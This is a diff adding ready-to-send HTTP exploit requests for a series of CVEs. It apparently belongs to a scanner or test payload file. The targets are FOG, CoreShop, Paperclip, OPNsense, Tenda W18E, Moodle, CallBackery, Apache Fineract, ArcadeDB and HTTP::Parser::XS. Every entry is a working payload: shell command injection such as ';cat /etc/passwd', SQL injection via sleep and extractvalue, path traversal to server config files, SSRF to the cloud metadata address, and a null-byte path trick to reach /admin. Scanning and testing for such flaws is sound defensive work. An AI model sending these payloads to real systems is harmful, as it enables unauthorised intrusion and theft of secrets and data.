@@ -4908,3 +4908,45 @@ POST /api/app/create_event header="Content-Type: application/json" body="{\"titl
 # --- CVE-2026-116778 (FOG): a low-privileged API user can set the Storage Node
 #     ftppath, which FOGImageReplicator interpolates into an lftp command. ---
 PUT /fog/storagenode/1/edit header="Content-Type: application/json" body="{\"name\":\"node\",\"user\":\"fog\",\"pass\":\"secret\",\"ftppath\":\"/images;id\"}"
+
+# --- CVE-2026-119655 / CVE-2026-119656 (CoreShop): GetGoodsPageList appends
+#     the caller order parameter to ORDER BY after a weak field-name check. ---
+GET /api/Good/GetGoodsPageList?order=id%2C(select%20sleep(5))&pageIndex=1&pageSize=20
+GET /api/Agent/GetGoodsPageList?order=(select%20extractvalue(1%2Cconcat(0x7e%2Cversion())))&pageIndex=1&pageSize=20
+
+# --- CVE-2026-119713 (Paperclip): cleanupCommand and teardownCommand are run
+#     through a shell when the execution workspace is archived. ---
+PATCH /api/execution-workspaces/ws-1 header="Content-Type: application/json" body="{\"cleanupCommand\":\"tar czf /tmp/workspace.tgz .;id\",\"teardownCommand\":\"true\"}"
+
+# --- CVE-2026-119409 (OPNsense): the firmware mirror setting reaches eval in
+#     opnsense-update, and the signature check is disabled through sed. ---
+POST /api/core/firmware/set header="Content-Type: application/json" body="{\"mirror\":\"https://mirror.example.com/pkg;id\"}"
+
+# --- CVE-2026-118238 (Tenda W18E): the diagnose protocol and targetDevice
+#     JSON fields are concatenated into a tcpdump command. ---
+POST /goform/setDiagnose header="Content-Type: application/json" body="{\"protocol\":\"icmp;cat /etc/passwd\",\"targetDevice\":\"192.0.2.1\"}"
+
+# --- CVE-2026-119553 (Moodle): the Blackboard question import copies img src
+#     paths outside the draft area and reads server files such as config.php. ---
+POST /question/format/blackboard_six/import.php header="Content-Type: application/zip" body="<img src=\"../../../../config.php\">"
+
+# --- CVE-2026-118988 (CallBackery): /doc passes the name parameter to
+#     Pod::Simple::Search, which joins :: parts into a path and escapes @INC. ---
+GET /doc?name=..::..::..::etc::motd
+
+# --- CVE-2026-64618 (Apache Fineract): the advance-search condition parameter
+#     is concatenated into SQL. ---
+POST /fineract-provider/api/v1/search/advance header="Content-Type: application/json" body="{\"outStandingAmountPercentageCondition\":\"1 AND (SELECT SLEEP(5))\"}"
+
+# --- CVE-2026-65874 (Apache Fineract): centers and datatable ordering
+#     parameters are concatenated into the SQL ORDER BY clause. ---
+GET /api/v1/centers?orderBy=(select%20sleep(5))&sortOrder=asc&order=1
+GET /api/v1/datatables/m_center/1?orderBy=id%2C(select%20sleep(5))&sortOrder=asc&order=1
+
+# --- CVE-2026-119575 (ArcadeDB): after the LOAD CSV block list is emptied, a
+#     LOAD CSV statement reaches cloud metadata and internal services. ---
+POST /api/v1/command header="Content-Type: application/json" body="{\"language\":\"sql\",\"command\":\"LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' WITH headers = false\"}"
+
+# --- CVE-2026-116130 (HTTP::Parser::XS): %00 truncates PATH_INFO after the XS
+#     parser URL-decodes it, so a proxy and the application route differently. ---
+GET /admin%00.css
